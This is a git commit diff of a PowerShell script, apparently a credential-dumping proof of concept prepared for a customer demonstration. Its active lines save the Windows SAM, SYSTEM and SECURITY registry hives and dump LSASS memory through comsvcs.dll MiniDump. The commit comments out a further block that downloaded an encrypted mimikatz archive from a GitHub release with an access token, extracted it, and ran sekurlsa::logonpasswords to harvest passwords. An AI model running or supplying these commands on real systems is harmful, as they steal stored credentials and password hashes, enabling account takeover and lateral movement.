96b7911d02a8aaff1ceea1367ef462ed3e6e17b0
tameval <114147355+tameval@users.noreply.github.com>
2022-10-30 17:13:27 +0900

    Update cdumpa_33667.ps1

--- 33667/cdumpa_33667.ps1
+++ 33667/cdumpa_33667.ps1
@@ -1,9 +1,11 @@
 Remove-Item $env:TEMP\mimihash.txt, $env:TEMP\lsass.dmp, $env:TEMP\SAM.dmp, $env:TEMP\SYSTEM.dmp, $env:TEMP\SECURITY.dmp -ErrorAction SilentlyContinue
 cmd.exe /c "reg.exe save hklm\security %TEMP%\SECURITY.dmp & reg.exe save hklm\system %TEMP%\SYSTEM.dmp & reg.exe save hklm\sam %TEMP%\SAM.dmp"
 C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
-$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
-cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\enc_mimikatz.zip'
-Remove-Item $env:TEMP\enc_mimikatz.zip
-cd $env:TEMP
-.\mimikatz.exe "sekurlsa::minidump %TEMP%\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File ($Env:TEMP + "\mimihash.txt")
-Remove-Item $env:TEMP\mimikatz.exe
+
+#####Need to discuss with POC customer regarding execution of mimikatz#####
+#$tkn= Get-Content "C:\CRDemo\tkn.txt"; $headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}; Invoke-WebRequest "https://api.github.com/repos/tameval/poc124509/releases/assets/81648140" -Headers $headers -OutFile $env:TEMP\enc_mimikatz.zip
+#cmd.exe /c '"C:\Program Files\7-Zip\7z.exe" e -ppassword123 -o%TEMP% %TEMP%\enc_mimikatz.zip'
+#Remove-Item $env:TEMP\enc_mimikatz.zip
+#cd $env:TEMP
+#.\mimikatz.exe "sekurlsa::minidump %TEMP%\lsass.dmp" "sekurlsa::logonpasswords" "exit" | Out-File ($Env:TEMP + "\mimihash.txt")
+#Remove-Item $env:TEMP\mimikatz.exe
